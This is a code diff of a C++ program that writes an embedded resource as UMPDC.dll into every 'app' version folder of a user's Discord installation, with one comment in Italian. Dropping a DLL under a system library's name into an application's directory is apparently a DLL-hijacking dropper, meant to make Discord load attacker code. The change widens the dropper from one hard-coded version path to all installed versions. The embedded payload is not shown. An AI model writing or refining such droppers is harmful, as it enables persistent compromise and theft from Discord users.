@@ -52,13 +52,10 @@ std::string getSystemUsername()
     return "";
 }
 
-
-
 void copyDll(const fs::path& sourcePath, const fs::path& destinationPath)
 {
     try // If you want to avoid exception handling, then use the error code overload of the following functions.
     {
-        fs::create_directories(destinationPath); // Recursively create target directory if not existing.
         fs::copy_file(sourcePath, destinationPath/sourcePath.filename(), fs::copy_options::overwrite_existing);
     }
     catch (std::exception& e) // Not using fs::filesystem_error since std::bad_alloc can throw too.  
@@ -73,15 +70,18 @@ int main()
         
 
     std::string username = getSystemUsername();
+    fs::path discordFolder = "C:\\Users\\" + username + "\\AppData\\Local\\Discord";
 
-    fs::path destinationFolder = "C:\\Users\\"+username+"\\AppData\\Local\\Discord\\app-1.0.9013\\UMPDC.dll";
-
-    fs::path tempDllPath = fs::temp_directory_path() / "UMPDC.dll";
-
-    std::vector<char> resourceData = getResourceData();
-    std::ofstream outputFile(destinationFolder, std::ios::binary); 
-    outputFile.write(resourceData.data(), resourceData.size());
-
-
-
+    // Cerca le cartelle che iniziano con "app" all'interno della cartella Discord
+    for (const auto& entry : fs::directory_iterator(discordFolder)) {
+        if (entry.is_directory()) {
+            std::string folderName = entry.path().filename().string();
+            if (folderName.find("app") == 0) {
+                fs::path destinationFolder = entry.path() ;
+                fs::path tempDllPath = fs::temp_directory_path() / "UMPDC.dll";
+                saveResourceDataToFile(tempDllPath);
+                copyDll(tempDllPath, destinationFolder);
+            }
+        }
+    }
 }
